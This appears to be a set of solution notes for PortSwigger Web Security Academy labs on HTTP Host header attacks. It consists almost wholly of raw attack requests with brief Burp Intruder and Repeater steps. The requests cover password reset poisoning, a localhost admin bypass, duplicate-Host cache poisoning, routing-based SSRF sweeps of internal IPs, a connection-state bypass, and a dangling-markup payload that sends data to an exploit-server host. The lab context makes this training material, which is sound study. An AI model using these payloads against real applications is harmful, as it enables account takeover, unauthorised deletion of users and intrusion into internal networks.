## 1. Basic password reset poisoning

```
POST /forgot-password HTTP/2
Host: exploit-0a4e00450321e95d81c2010001d4004f.exploit-server.net
Cookie: _lab=46%7cMCwCFA2EJMpEKZR%2bNEo5FS5cK2XpHW9FAhQEoT70xKAneAi%2bSaHDTV5wOhK9e6nXia1etzwIN2LEIdmN804iiZAZx2rIxMsHaRGzmdi%2b0J89GMl9ZDIBGsVSsb7oyc0BQpun1bMgXByJJecbuW0K4gUyqYmQ6zgts%2bJrEMZ7wZYtdg4%3d; session=bEgMJCEQ48ZpC8tIgQiJZtXySRC0lHMG
Content-Length: 53

csrf=1csVVykiRQ7eEcoSE4zWmkk8sQ4DjyHm&username=carlos
```


## 2. Host header authentication bypass

```
GET /admin/delete?username=carlos HTTP/2
Host: localhost
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Sec-Ch-Ua: ".Not/A)Brand";v="99", "Google Chrome";v="116", "Chromium";v="116"
Sec-Ch-Ua-Platform: Windows
Sec-Ch-Ua-Mobile: ?0


```


## 3. Web cache poisoning via ambiguous requests

```
GET / HTTP/1.1
Host: 0ad3008a039f106880bb76b3007d0060.h1-web-security-academy.net
Host: exploit-0a2000cb0366105c80db751b016f00f5.exploit-server.net
Cookie: session=bYZefc0oN7cTn4aGIx7TDZMkKsvhOWbe; _lab=47%7cMC0CFQCKIC7Q8PBDFooZVNhR7AHYgR11ZwIUeGAHn%2b%2faY%2fbWDr2zZD11KmuS04%2bcMSEOGjdVXqLYGDz5ZJkKbx%2fzGDzqxNQTCQL0NccdvmhCRQrs37W9qeqCbokfMtsOVmskXIXTgm2rZ23xFTEKags%2b5XHMCmncENk8wHLFEgHHF1A7DiCZ
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close


```


## 4. Routing-based SSRF

Intruder. Uncheck "Update Host header to match target

```
GET / HTTP/2
Host: 192.168.0.§0§
Cookie: session=MUoYjLitWs2CfzOPChGFJ95YkYutzC6J; _lab=47%7cMC0CFQCCY9bIVNb5kQiVk9XADZHWac1UsgIUc5TeLJ4FVV3ltM7q%2bGrYNVxEHlMaRCHK1wnLuhehytjvO6xTngeKEAQcq%2fSQ7lBaTqKz6wzeMEKjfM4jxqpc3Smof21xhWvdrK7PJqlR%2bdrGqIA4eGOpTzS7GZMM%2bfXSzrQh%2bIIDxyaP
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a49009103a9edaf805153dc00d90092.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9


```

Repeater
```
POST /admin/delete HTTP/2
Host: 192.168.0.121
Cookie: session=MUoYjLitWs2CfzOPChGFJ95YkYutzC6J; _lab=47%7cMC0CFQCCY9bIVNb5kQiVk9XADZHWac1UsgIUc5TeLJ4FVV3ltM7q%2bGrYNVxEHlMaRCHK1wnLuhehytjvO6xTngeKEAQcq%2fSQ7lBaTqKz6wzeMEKjfM4jxqpc3Smof21xhWvdrK7PJqlR%2bdrGqIA4eGOpTzS7GZMM%2bfXSzrQh%2bIIDxyaP
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a49009103a9edaf805153dc00d90092.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Length: 53

csrf=LIOJkAazY8Kf6pYLDByEwsQUxZa53i7D&username=carlos
```


## 5. SSRF via flawed request parsing

Intruder. Uncheck "Update Host header to match target

```
GET https://0a1c00a604446864805d3505004700f8.web-security-academy.net/ HTTP/2
Host: 192.168.0.§1§
Cookie: session=mvtePhgcGWw6t922rlJGJwb6cRmBrmD7; _lab=47%7cMC0CFFFWbwPWXdg4tBu8bcinu3U3O3XBAhUAjQvS4M8pzJnViuZpTOPaPR6aMYyWnLVGn63Wk83bmyp3Xq3BJ%2b1zJ7co2fWb5vX8ZW7gWUOqQGsMD6qH5B%2bdNsVHPJxtpxc%2b%2fPN%2fWIR33I%2bmL4R0rYtyPos3VfULaRSMslWS0RZDona9
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9


```

Repeater
```
POST https://0a1c00a604446864805d3505004700f8.web-security-academy.net/admin/delete HTTP/2
Host: 192.168.0.56
Cookie: session=mvtePhgcGWw6t922rlJGJwb6cRmBrmD7; _lab=47%7cMC0CFFFWbwPWXdg4tBu8bcinu3U3O3XBAhUAjQvS4M8pzJnViuZpTOPaPR6aMYyWnLVGn63Wk83bmyp3Xq3BJ%2b1zJ7co2fWb5vX8ZW7gWUOqQGsMD6qH5B%2bdNsVHPJxtpxc%2b%2fPN%2fWIR33I%2bmL4R0rYtyPos3VfULaRSMslWS0RZDona9
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Length: 53

csrf=sgLWFRoPIzg71HngddoSBaCTbQLd0y2e&username=carlos
```


## 6. Host validation bypass via connection state attack

Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection). Change the Connection header to keep-alive.

```
GET / HTTP/1.1
Host: 0a4b00cc0364dd7180fa9ec900a500b7.h1-web-security-academy.net
Cookie: session=1jZxcK29O5Xz7GcuRQXEAjuYZhj7bc4z; _lab=47%7cMC0CFQCMhVUyfC4sHrgPEJq%2fbqrbxtr2RwIUMRDMjkcUWhwVUSJMplWve50R%2fKmQBH78HPn%2bb1FccXBN1%2bX937ki3L2yurUcDRog%2fabcPRsN9apTJ0cbAio%2bkEPaSgZqPB68085HFO2GUWFFCKB6PbXb2hUM6C5U5Ifv6CVb1WTUcpIJJqqo
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
```

```
POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Cookie: session=1jZxcK29O5Xz7GcuRQXEAjuYZhj7bc4z; _lab=47%7cMC0CFQCMhVUyfC4sHrgPEJq%2fbqrbxtr2RwIUMRDMjkcUWhwVUSJMplWve50R%2fKmQBH78HPn%2bb1FccXBN1%2bX937ki3L2yurUcDRog%2fabcPRsN9apTJ0cbAio%2bkEPaSgZqPB68085HFO2GUWFFCKB6PbXb2hUM6C5U5Ifv6CVb1WTUcpIJJqqo
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Length: 53

csrf=cAXzgZ4u3J3OL7HOVm3L0ZUBMlR2Q2FE&username=carlos
```


## 7. Password reset poisoning via dangling markup

```
POST /forgot-password HTTP/2
Host: 0a9c00bb03d6eef681d3e8dd00c60081.web-security-academy.net:'><img%20src="https://exploit-0a4300f403eceee68123e717012d0066.exploit-server.net/exploit?cookie=
Cookie: _lab=47%7cMC0CFHaOpHAqZzcQEnhcJqPNY%2bRCoGp8AhUAkrDIO2%2fvlysqe98DI60jwpOfedSMmCh%2fsf4kKYuC%2bwkZmCk7BDG1aWar0JOKnQ8LchV5wTUihLBMN9Yx29wS5i4iHBKhWruRp4Yyd3cWbq1gnhdTzn02XOnQ6nJoDzCQK7AK0Bfuk2rh; session=K0EgCKrnr2RY95cH81Se065ezGTsQbmX
Content-Length: 53
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
Origin: https://0a9c00bb03d6eef681d3e8dd00c60081.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a9c00bb03d6eef681d3e8dd00c60081.web-security-academy.net/forgot-password
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

csrf=tcD3WZpeyddLqxIeuF38T7OoVFv7RM0x&username=carlos
```
